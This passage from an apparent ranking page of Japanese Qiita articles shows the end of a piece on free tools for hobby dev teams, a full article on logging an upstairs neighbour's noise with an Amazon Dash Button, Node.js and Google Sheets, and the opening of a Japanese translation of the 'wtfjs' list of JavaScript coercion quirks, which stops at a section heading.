<p>タスク進捗はチャットから見たいと思いますので、 <strong><a href="https://slack.com/apps" rel="nofollow noopener" target="_blank">Slack Apps</a></strong> にあるものを優先的に選んでみるのでもいいかもしれません。</p>

<h2>
<span id="monitoring" class="fragment"></span><a href="#monitoring"><i class="fa fa-link"></i></a>Monitoring</h2>

<p>趣味チームとはいえクオリティを気にしていきたい場合、何かしらのモニタリングが必要です。</p>

<ul>
<li><a href="https://www.datadoghq.com/" rel="nofollow noopener" target="_blank">Datadog</a></li>
<li><a href="https://mackerel.io/ja/" rel="nofollow noopener" target="_blank">Mackerel</a></li>
<li><a href="https://newrelic.com/" rel="nofollow noopener" target="_blank">New-Relic</a></li>
</ul>

<h3>
<span id="point-6" class="fragment"></span><a href="#point-6"><i class="fa fa-link"></i></a>Point</h3>

<p>一言にモニタリングといってもサーバレイヤとアプリレイヤがありますので、それによってもポイントが異なります。<br>
GCEで無料仮想マシンを使っている場合には Datadog をとりあえず入れておくのがよいでしょうし、作ったアプリの挙動を見たいってことであれば New-Relic だったり他のものを使うことになると思います。</p>

<h1>
<span id="おわりに" class="fragment"></span><a href="#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB"><i class="fa fa-link"></i></a><strong>おわりに</strong>
</h1>

<p><strong>無料縛り</strong> での開発環境整備、いかがだったでしょうか。<br>
もちろんお金を少しでも払えばまた全然違った結果になるのですが、無料でもかなり便利に &amp; 遊べるようになるかと思います。<br>
使ってみると便利なものばかりですので、色々なものを試してみるのはとてもよいなと思いました。</p>

<p>この記事で挙げたカテゴリや、ここにないカテゴリでも趣味チームに向いているサービスなんかがあったらぜひ共有いただきたいです！<br>
それでは <strong>よい趣味チームライフ</strong> を！</p>

<div class="footnotes">
<hr>
<ol>

<li id="fn1">
<p><a href="https://slackhq.com/introducing-shared-channels-where-you-can-work-with-anyone-in-slack-8c5d2a943f57" rel="nofollow noopener" target="_blank">Shared Channel</a>という機能が今後登場するようなので、この部分は短所としては弱くなっていくかもしれません。 <a href="#fnref1">↩</a></p>
</li>

</ol>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">34位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>288</kbd>
		<a target="_blank" href="https://qiita.com/momoiroshikibu/items/d6b30959725eea8c2038">上の階の人の騒音をAmazon Dash ButtonとGoogle Sheetsで記録する</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-25<br />12:11:02</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/7745.html">momoiroshikibu</a>(5件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/7745/profile-images/1473680706">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Node.js]</b> <b>[GoogleSpreadSheet]</b> <b>[GoogleSheetsAPI]</b> <b>[AmazonDashButton]</b> <b>[Dasher]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="かくかくしかじか" class="fragment"></span><a href="#%E3%81%8B%E3%81%8F%E3%81%8B%E3%81%8F%E3%81%97%E3%81%8B%E3%81%98%E3%81%8B"><i class="fa fa-link"></i></a>かくかくしかじか</h1>

<p>賃貸マンションの上の階の人がうるさい。<br>
野球の硬式ボールを落としたような「ドン」、「ゴン」という音が朝と夜に聞こえてくる。上の階の人は野球選手？<br>
管理会社に相談すると、記録をとって欲しいとのこと。</p>

<h1>
<span id="目的" class="fragment"></span><a href="#%E7%9B%AE%E7%9A%84"><i class="fa fa-link"></i></a>目的</h1>

<p>ということで、上の階の人の騒音をなんとかしたい。<br>
というか、管理会社になんとかして欲しい。<br>
管理会社に連絡したところ、「騒音の日時を記録してもらえますか？」と言われた。<br>
なんとなく「はいはい、とりあえず記録してください。話はそれからです。」的な雰囲気を感じたので、「どうですか、見てくださいよこの状況。」と自信を持って伝えたい。</p>

<h1>
<span id="記録する情報" class="fragment"></span><a href="#%E8%A8%98%E9%8C%B2%E3%81%99%E3%82%8B%E6%83%85%E5%A0%B1"><i class="fa fa-link"></i></a>記録する情報</h1>

<ul>
<li>時刻</li>
<li>回数(断続的に騒音が続く場合があるので、その回数)</li>
</ul>

<h1>
<span id="まずは紙とペンで" class="fragment"></span><a href="#%E3%81%BE%E3%81%9A%E3%81%AF%E7%B4%99%E3%81%A8%E3%83%9A%E3%83%B3%E3%81%A7"><i class="fa fa-link"></i></a>まずは紙とペンで</h1>

<p>手っ取り早く、紙とペンで時刻と回数を記録。<br>
<a href="https://camo.qiitausercontent.com/6a92c43ab83743239cf11ca1ee9bae303c41b710/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f373734352f34396262323963322d393864322d323461322d633364302d3830383539306539666537662e6a706567" target="_blank" rel="nofollow noopener"><img width="400" alt="初代.jpg" src="https://camo.qiitausercontent.com/6a92c43ab83743239cf11ca1ee9bae303c41b710/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f373734352f34396262323963322d393864322d323461322d633364302d3830383539306539666537662e6a706567" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/7745/49bb29c2-98d2-24a2-c3d0-808590e9fe7f.jpeg"></a><br>
こんな感じ。「ドン」は音の感じ。お察しください。</p>

<h1>
<span id="集計して報告" class="fragment"></span><a href="#%E9%9B%86%E8%A8%88%E3%81%97%E3%81%A6%E5%A0%B1%E5%91%8A"><i class="fa fa-link"></i></a>集計して報告</h1>

<p>紙に記載された記録をExcelに転記し、グラフ付きで管理会社へメールで送付。<br>
時刻だけ記録されていても、ちゃんと見てくれなさそうな気がしたので、こんな感じのグラフを作成。<br>
それとなく考察つき。ここが重要な気がするので。</p>

<p><a href="https://camo.qiitausercontent.com/c833b9d55045da5654f1cc84b4d2eaef2ced25d1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f373734352f65633635623639382d343265342d323838392d306234642d6338663235363630386634322e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/c833b9d55045da5654f1cc84b4d2eaef2ced25d1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f373734352f65633635623639382d343265342d323838392d306234642d6338663235363630386634322e706e67" alt="日別.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/7745/ec65b698-42e4-2889-0b4d-c8f256608f42.png"></a></p>

<p><a href="https://camo.qiitausercontent.com/b7930e440aab0bced18ac5483e7b070deae46e9d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f373734352f61356566316630652d656532612d643233612d323733612d6333363664653365383135372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/b7930e440aab0bced18ac5483e7b070deae46e9d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f373734352f61356566316630652d656532612d643233612d323733612d6333363664653365383135372e706e67" alt="時間帯別.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/7745/a5ef1f0e-ee2a-d23a-273a-c366de3e8157.png"></a></p>

<h1>
<span id="結果" class="fragment"></span><a href="#%E7%B5%90%E6%9E%9C"><i class="fa fa-link"></i></a>結果</h1>

<p>これを元に、管理会社も上の階の人に電話で注意してくれているようだが、結局効果はなし。<br>
「設備不良かもしれない」という疑いもあるらしく、記録は継続することに。(本当かな？)<br>
記録、地味にめんどい。</p>

<h1>
<span id="初代の問題点" class="fragment"></span><a href="#%E5%88%9D%E4%BB%A3%E3%81%AE%E5%95%8F%E9%A1%8C%E7%82%B9"><i class="fa fa-link"></i></a>初代の問題点</h1>

<p>面倒だったこと</p>

<ul>
<li> 紙とペンという2つの道具。</li>
<li> きれいな字で。</li>
<li> 記録時に時計を見る必要がある。</li>
<li> 気持ち的に。</li>
<li> いちいちペンとメモがある場所まで移動。</li>
<li> ペンのインクがかすれる時がある。地味ストレス。(これはお金で解決できるな…)</li>
</ul>

<p>考えていなかったこと</p>

<ul>
<li>管理会社には記録を可視化して、有無を言わせないようにしたい。</li>
<li>これはなんだかんだ、結果を送るタイミングで気づいた。数値だけ送っても意味ないかも。みたいな。</li>
<li>記録後、いちいちExcelに転記してグラフを作るのもまた面倒。</li>
</ul>

<h2>
<span id="二代目の計画" class="fragment"></span><a href="#%E4%BA%8C%E4%BB%A3%E7%9B%AE%E3%81%AE%E8%A8%88%E7%94%BB"><i class="fa fa-link"></i></a>二代目の計画</h2>

<p>問題点を解決するため、代替手段を探す。<br>
家の中にAmazon Prime Dayに100円で買ったAmazon Dash Buttonを発見。箱入り娘状態。<br>
これのボタンを押したら、記録出来るようにしよう、という単純な発想。こういう例、よく見るし簡単そう。<br>
データの保存先はGoogle Sheetsにしよう。どのみち管理会社にはグラフで報告するし。<br>
グラフも常に最新化されていて欲しい。いちいち集計したくない。</p>

<p><a href="https://camo.qiitausercontent.com/d9a6e0996c1b667cecd4b1cb259248d5b4004e16/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f373734352f62306634643631622d653063312d376263332d333236622d3664396366356436383465382e6a706567" target="_blank" rel="nofollow noopener"><img width="400" alt="二代目.jpg" src="https://camo.qiitausercontent.com/d9a6e0996c1b667cecd4b1cb259248d5b4004e16/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f373734352f62306634643631622d653063312d376263332d333236622d3664396366356436383465382e6a706567" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/7745/b0f4d61b-e0c1-7bc3-326b-6d9cf5d684e8.jpeg"></a></p>

<h2>
<span id="二代目の登場" class="fragment"></span><a href="#%E4%BA%8C%E4%BB%A3%E7%9B%AE%E3%81%AE%E7%99%BB%E5%A0%B4"><i class="fa fa-link"></i></a>二代目の登場</h2>

<p>出来たものはコレ。<a href="https://github.com/momoiroshikibu/dash-button-noise-reporter" rel="nofollow noopener" target="_blank">dash-button-noise-reporter</a></p>

<p>使ったものはこんな感じ。(大したことない)</p>

<ul>
<li>Amazon Dash Button(Post-it)</li>
<li>Node.js(dasher)</li>
<li>Google Spread Sheet</li>
<li>Google Sheets API</li>
</ul>

<p>簡単なイメージ</p>

<p><a href="https://camo.qiitausercontent.com/54b7578a9460efe27cbe6fd9fb64c8c9b6376106/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f373734352f38643734643430392d613366622d396131612d303866632d6436353762663532386333312e706e67" target="_blank" rel="nofollow noopener"><img width="900" alt="dash-button-architecture.png" src="https://camo.qiitausercontent.com/54b7578a9460efe27cbe6fd9fb64c8c9b6376106/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f373734352f38643734643430392d613366622d396131612d303866632d6436353762663532386333312e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/7745/8d74d409-a3fb-9a1a-08fc-d657bf528c31.png"></a></p>

<p>適当にググったら、<a href="https://github.com/hortinstein/node-dash-button" rel="nofollow noopener" target="_blank">node-dash-button</a>というライブラリがあったので、使った。<br>
いい感じだった。サンプルコードをほぼ踏襲する感じでOKだった。</p>

<p>こんな感じのコード。Dash Buttonのイベントを拾うのはめちゃ簡単だった。圧倒的感謝。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">DashButton</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'node-dash-button'</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">dashButton</span> <span class="o">=</span> <span class="nx">DashButton</span><span class="p">(</span><span class="nx">dashButtonMacAddress</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="s1">'all'</span><span class="p">);</span> <span class="c1">// dashButtonMacAddressは環境変数から</span>
<span class="c1">// listen</span>
<span class="nx">dashButton</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">'detected'</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">eventHappenedAt</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'button pressed'</span><span class="p">,</span> <span class="nx">eventHappenedAt</span><span class="p">);</span>
<span class="p">});</span>
</pre></div></div>

<p>日時の記録は、Google Sheetsを使った。<br>
上の階の人のために、IaaSのDBっぽいサービスを使うのもイヤだったので、最高の無料ソリューションだった。<br>
グラフ化も簡単に出来た。Excelを前にすると弱気になる自分も、Google Sheetsの前だと強くなれる気がした。<br>
グラフを画像にして参照出来るようにもなった。(これは偶然見つけた機能)<br>
このQiitaの記事に表示されているグラフ画像も、最新のグラフの画像を参照している。Google Sheetsスゴすぎる。</p>

<p>ちなみに、グラフはこんな感じ。<br>
日別、時間帯別。毎日増え続けるけど、どうでもいい。そこは考えない。騒音が解決すれば、このSheetsともサヨナラなので。</p>

<p><a href="https://camo.qiitausercontent.com/99de77289c665347e8ff549a00fa9219ae52ed16/68747470733a2f2f646f63732e676f6f676c652e636f6d2f7370726561647368656574732f642f31366c6f327368706166316e2d7161467a4f6b6e38376e756a4c543852614350585772457368546a4e4470452f70756263686172743f6f69643d33373633323438333926666f726d61743d696d616765" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/99de77289c665347e8ff549a00fa9219ae52ed16/68747470733a2f2f646f63732e676f6f676c652e636f6d2f7370726561647368656574732f642f31366c6f327368706166316e2d7161467a4f6b6e38376e756a4c543852614350585772457368546a4e4470452f70756263686172743f6f69643d33373633323438333926666f726d61743d696d616765" data-canonical-src="https://docs.google.com/spreadsheets/d/16lo2shpaf1n-qaFzOkn87nujLT8RaCPXWrEshTjNDpE/pubchart?oid=376324839&amp;format=image"></a></p>

<p><a href="https://camo.qiitausercontent.com/e6844987cf816b32e580e885c1152cc9908a1a59/68747470733a2f2f646f63732e676f6f676c652e636f6d2f7370726561647368656574732f642f31366c6f327368706166316e2d7161467a4f6b6e38376e756a4c543852614350585772457368546a4e4470452f70756263686172743f6f69643d373637323834353026666f726d61743d696d616765" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/e6844987cf816b32e580e885c1152cc9908a1a59/68747470733a2f2f646f63732e676f6f676c652e636f6d2f7370726561647368656574732f642f31366c6f327368706166316e2d7161467a4f6b6e38376e756a4c543852614350585772457368546a4e4470452f70756263686172743f6f69643d373637323834353026666f726d61743d696d616765" data-canonical-src="https://docs.google.com/spreadsheets/d/16lo2shpaf1n-qaFzOkn87nujLT8RaCPXWrEshTjNDpE/pubchart?oid=76728450&amp;format=image"></a></p>

<h1>
<span id="苦労したところ" class="fragment"></span><a href="#%E8%8B%A6%E5%8A%B4%E3%81%97%E3%81%9F%E3%81%A8%E3%81%93%E3%82%8D"><i class="fa fa-link"></i></a>苦労したところ</h1>

<p>GoogleのAPIの認証周り。これが一番時間かかった。<br>
クライアントシークレットファイルをダウンロードする。<br>
このQuickstartは絶対にやるべき。絶対にやるべき。とても学びが多い。<br>
<a href="https://developers.google.com/sheets/api/quickstart/nodejs" class="autolink" rel="nofollow noopener" target="_blank">https://developers.google.com/sheets/api/quickstart/nodejs</a></p>

<p>APIをコールする際、これをベースに、などを取得してファイルに保存する必要があるので、面倒でも絶対にやるべき(二回目)。<br>
上のリンクのコードは読んでおくべき。<br>
結果的に、ググるよりも圧倒的に理解が早い。</p>

<h1>
<span id="運用してみてわかったこと" class="fragment"></span><a href="#%E9%81%8B%E7%94%A8%E3%81%97%E3%81%A6%E3%81%BF%E3%81%A6%E3%82%8F%E3%81%8B%E3%81%A3%E3%81%9F%E3%81%93%E3%81%A8"><i class="fa fa-link"></i></a>運用してみてわかったこと</h1>

<ul>
<li>管理会社への連絡は、どんなものを作っても、結局面倒。(二代目を作ってから、まだ報告していない…)</li>
<li>Node.jsのサーバーはMacBook Proで動かしていたのだけれど、常に起動していないと記録できない…</li>
</ul>

<p>次回、Raspberry Pi編。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">35位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>284</kbd>
		<a target="_blank" href="https://qiita.com/rana_kualu/items/793f0cbdde6a88f86394">くそったれJavaScript</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-21<br />22:21:40</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/26088.html">rana_kualu</a>(192件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/26088/profile-images/1473684492">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[JavaScript]</b> <b>[戸田奈津子訳]</b> <b>[WTF]</b> <b>[WTFJS]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>以下は<a href="https://github.com/denysdovhan/wtfjs" rel="nofollow noopener" target="_blank">What the f*ck JavaScript?</a>というリポジトリの戸田奈津子訳です。</p>

<h1>
<span id="what-the-fck-javascript" class="fragment"></span><a href="#what-the-fck-javascript"><i class="fa fa-link"></i></a>What the f*ck JavaScript?</h1>

<p>JavaScriptは素晴らしい言語です。<br>
単純な構文、大きなエコシステム、そして最も重要なところはコミュニティです。</p>

<p>同時に、JavaScriptは非常にトリッキーで面倒な言語でもあります。<br>
幾つかの仕様は我々の仕事を地獄に変え、他の幾つかは笑える仕様です。</p>

<p>WTFJSの大元のアイデアは<a href="https://twitter.com/brianleroux" rel="nofollow noopener" target="_blank">Brian Leroux</a>によるものです。<br>
以下のリストは2012年のdotJSにおける彼のトーク、<a href="https://www.youtube.com/watch?v=et8xNAc2ic8" rel="nofollow noopener" target="_blank">WTFJS</a>に触発されています。</p>

<h1>
<span id="node-packaged-manuscript" class="fragment"></span><a href="#node-packaged-manuscript"><i class="fa fa-link"></i></a>Node Packaged Manuscript</h1>

<p>以下の内容はnpmでインストールできます。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ npm install -g wtfjs
</pre></div></div>

<p><code>wtfjs</code>コマンドで読めるようになるはずです。<br>
駄目だったらここで読みましょう。</p>

<h1>
<span id="table-of-contents" class="fragment"></span><a href="#table-of-contents"><i class="fa fa-link"></i></a>Table of Contents</h1>

<h2>
<span id="motivation" class="fragment"></span><a href="#motivation"><i class="fa fa-link"></i></a>Motivation</h2>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>面白半分だ。
</pre></div></div>

<p><a href="https://en.wikipedia.org/wiki/Just_for_Fun" rel="nofollow noopener" target="_blank">Just for Fun: The Story of an Accidental Revolutionary</a>, Linus Torvalds</p>

<p>このリストの主な目的は、バグった実例を収集し、可能であればどうしてそうなっているのかを解説することです。<br>
これまで知らなかったことを学ぶのは楽しいでしょう。</p>

<p>初心者は、これらを通じてJavaScriptをより深く理解することができます。<br>
これらを見ているときっと仕様書を読みたくなることでしょう。</p>

<p>プロの開発者であれば、JavaScriptの持つ罠や予期せぬ挙動の参考資料として役立ててくれると思います。</p>

<p>いずれにせよ、以下を読んでみてください。<br>
おそらく新しい発見があることでしょう。</p>

<h2>
<span id="notation" class="fragment"></span><a href="#notation"><i class="fa fa-link"></i></a>Notation</h2>

<p><code>// -&gt;</code>は式の結果を表します。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="mi">1</span> <span class="o">+</span> <span class="mi">1</span> <span class="c1">// -&gt; 2</span>
</pre></div></div>

<p><code>// &gt;</code>はconsole.logもしくはその他の出力内容を表します。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'hello, world!'</span><span class="p">)</span> <span class="c1">// &gt; hello, world!</span>
</pre></div></div>

<p><code>//</code>は解説用の単なるコメントです。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="c1">// Assigning a function to foo constant</span>
    <span class="kr">const</span> <span class="nx">foo</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{}</span>
</pre></div></div>

<h2>
<span id="examples" class="fragment"></span><a href="#examples"><i class="fa fa-link"></i></a>Examples</h2>

<h3>
<span id="-is-equal-" class="fragment"></span><a href="#-is-equal-"><i class="fa fa-link"></i></a>[] is equal ![]</h3>

<p>ArrayはArrayとイコールではない。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="p">[]</span> <span class="o">==</span> <span class="o">!</span><span class="p">[]</span> <span class="c1">// -&gt; true</span>
</pre></div></div>

<p><a href="https://www.ecma-international.org/ecma-262/#sec-logical-not-operator" rel="nofollow noopener" target="_blank">12.5.9 Logical NOT Operator (!)</a><br>
<a href="https://www.ecma-international.org/ecma-262/#sec-abstract-equality-comparison" rel="nofollow noopener" target="_blank">7.2.13 Abstract Equality Comparison</a></p>

<h3>
<span id="true-is-false" class="fragment"></span><a href="#true-is-false"><i class="fa fa-link"></i></a>true is false</h3>

<p>trueはfalseだった。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="o">!!</span><span class="s1">'false'</span> <span class="o">==</span>  <span class="o">!!</span><span class="s1">'true'</span>  <span class="c1">// -&gt; true</span>
    <span class="o">!!</span><span class="s1">'false'</span> <span class="o">===</span> <span class="o">!!</span><span class="s1">'true'</span> <span class="c1">// -&gt; true</span>
</pre></div></div>

<p>順番に考えるとわかりやすい。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="c1">// trueは数値扱いされると1になる</span>
    <span class="kc">true</span> <span class="o">==</span> <span class="s1">'true'</span>    <span class="c1">// -&gt; false</span>
    <span class="kc">false</span> <span class="o">==</span> <span class="s1">'false'</span>  <span class="c1">// -&gt; false</span>

    <span class="c1">// 'false'は空文字ではないので数値扱いされると1になる</span>
    <span class="o">!!</span><span class="s1">'false'</span> <span class="c1">// -&gt; true</span>
    <span class="o">!!</span><span class="s1">'true'</span>  <span class="c1">// -&gt; true</span>
</pre></div></div>

<p><a href="https://www.ecma-international.org/ecma-262/#sec-abstract-equality-comparison" rel="nofollow noopener" target="_blank">7.2.13 Abstract Equality Comparison</a></p>

<h3>
<span id="banana" class="fragment"></span><a href="#banana"><i class="fa fa-link"></i></a>baNaNa</h3>

<p>バナナ</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="s1">'b'</span> <span class="o">+</span> <span class="s1">'a'</span> <span class="o">+</span> <span class="o">+</span> <span class="s1">'a'</span> <span class="o">+</span> <span class="s1">'a'</span>
</pre></div></div>

<p>使い古されたジョークのリバイバルで、オリジナルは以下だ。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="s1">'foo'</span> <span class="o">+</span> <span class="o">+</span> <span class="s1">'bar'</span> <span class="c1">// -&gt; 'fooNaN'</span>
</pre></div></div>

<p>式が<code>'foo' + (+'bar')</code>と解釈され、'bar'は数値ではないので'NaN'という文字列になる。<br>
<a href="https://www.ecma-international.org/ecma-262/#sec-addition-operator-plus" rel="nofollow noopener" target="_blank">12.8.3 The Addition Operator (+)</a><br>
<a href="https://www.ecma-international.org/ecma-262/#sec-unary-plus-operator" rel="nofollow noopener" target="_blank">12.5.6 Unary + Operator</a></p>

<h3>
<span id="nan-is-not-a-nan" class="fragment"></span><a href="#nan-is-not-a-nan"><i class="fa fa-link"></i></a>NaN is not a NaN</h3>

<p>NaNはNaNではない。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="kc">NaN</span> <span class="o">===</span> <span class="kc">NaN</span> <span class="c1">// -&gt; false</span>
</pre></div></div>

<p>これは仕様で厳密に決められている。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span> 1. If Type(x) is different from Type(y), return false.
 2. If Type(x) is Number, then
   i. If x is NaN, return false.
   ii. If y is NaN, return false.
   iii. ………
</pre></div></div>

<p><a href="https://www.ecma-international.org/ecma-262/#sec-strict-equality-comparison" rel="nofollow noopener" target="_blank">7.2.14 Strict Equality Comparison</a></p>

<p>IEEEのNaNの仕様に従っている。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>Four mutually exclusive relations are possible: less than, equal, greater than, and unordered. The last case arises when at least one operand is NaN. Every NaN shall compare unordered with everything, including itself.
</pre></div></div>

<p><a href="https://stackoverflow.com/questions/1565164/1573715#1573715" rel="nofollow noopener" target="_blank">What is the rationale for all comparisons returning false for IEEE754 NaN values?</a></p>

<h3>
<span id="its-a-fail" class="fragment"></span><a href="#its-a-fail"><i class="fa fa-link"></i></a>It's a fail</h3>

<p>信じられないかもしれないが、答えは'fail'だ。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="p">(</span><span class="o">!</span><span class="p">[]</span><span class="o">+</span><span class="p">[])[</span><span class="o">+</span><span class="p">[]]</span><span class="o">+</span><span class="p">(</span><span class="o">!</span><span class="p">[]</span><span class="o">+</span><span class="p">[])[</span><span class="o">+!+</span><span class="p">[]]</span><span class="o">+</span><span class="p">([</span><span class="o">!</span><span class="p">[]]</span><span class="o">+</span><span class="p">[][[]])[</span><span class="o">+!+</span><span class="p">[]</span><span class="o">+</span><span class="p">[</span><span class="o">+</span><span class="p">[]]]</span><span class="o">+</span><span class="p">(</span><span class="o">!</span><span class="p">[]</span><span class="o">+</span><span class="p">[])[</span><span class="o">!+</span><span class="p">[]</span><span class="o">+!+</span><span class="p">[]]</span>
    <span class="c1">// -&gt; 'fail'</span>
</pre></div></div>

<p>以下のパターンが頻出することに気がつくだろう。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="p">(</span><span class="o">!</span><span class="p">[]</span><span class="o">+</span><span class="p">[])</span> <span class="c1">// -&gt; 'false'</span>
    <span class="o">!</span><span class="p">[]</span>      <span class="c1">// -&gt; false</span>
</pre></div></div>

<p><code>false</code>に<code>[]</code>を加算しようとしているため、右オペランドはstringに変換される。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="p">(</span><span class="o">!</span><span class="p">[]</span><span class="o">+</span><span class="p">[].</span><span class="nx">toString</span><span class="p">())</span> <span class="c1">// 'false'</span>
</pre></div></div>

<p>文字列に配列アクセスすると該当番目の文字が取得できる。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="s1">'false'</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="c1">// -&gt; 'f'</span>
</pre></div></div>

<p>残りも同じ構造だが、<code>i</code>の取って来かたは少しトリッキーだ。<br>
文字列'falseundefined'を作って、その10番目を取得している。</p>

<h3>
<span id="-is-truthy-but-not-true" class="fragment"></span><a href="#-is-truthy-but-not-true"><i class="fa fa-link"></i></a>[] is truthy, but not true</h3>

<p><code>[]</code>はtrueっぽいけどtrueではない。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="o">!!</span><span class="p">[]</span>       <span class="c1">// -&gt; true</span>
    <span class="p">[]</span> <span class="o">==</span> <span class="kc">true</span> <span class="c1">// -&gt; false</span>
</pre></div></div>

<p>ECMA-262で決められている仕様である。<br>
<a href="https://www.ecma-international.org/ecma-262/#sec-logical-not-operator" rel="nofollow noopener" target="_blank">12.5.9 Logical NOT Operator (!)</a><br>
<a href="https://www.ecma-international.org/ecma-262/#sec-abstract-equality-comparison" rel="nofollow noopener" target="_blank">7.2.13 Abstract Equality Comparison</a></p>

<h3>
<span id="null-is-falsy-but-not-false" class="fragment"></span><a href="#null-is-falsy-but-not-false"><i class="fa fa-link"></i></a>null is falsy, but not false</h3>

<p><code>null</code>はfalseっぽいけどfalseではない。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="o">!!</span><span class="kc">null</span>        <span class="c1">// -&gt; false</span>
    <span class="kc">null</span> <span class="o">==</span> <span class="kc">false</span> <span class="c1">// -&gt; false</span>
</pre></div></div>

<p>ところが0や''はfalseとイコールになる。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="mi">0</span> <span class="o">==</span> <span class="kc">false</span>  <span class="c1">// -&gt; true</span>
    <span class="s1">''</span> <span class="o">==</span> <span class="kc">false</span> <span class="c1">// -&gt; true</span>
</pre></div></div>

<p>これもECMA-262の仕様。<br>
<a href="https://www.ecma-international.org/ecma-262/#sec-abstract-equality-comparison" rel="nofollow noopener" target="_blank">7.2.13 Abstract Equality Comparison</a></p>

<h3>
<span id="documentall-is-an-object-but-its-undefined" class="fragment"></span><a href="#documentall-is-an-object-but-its-undefined"><i class="fa fa-link"></i></a>document.all is an object, but it's undefined</h3>

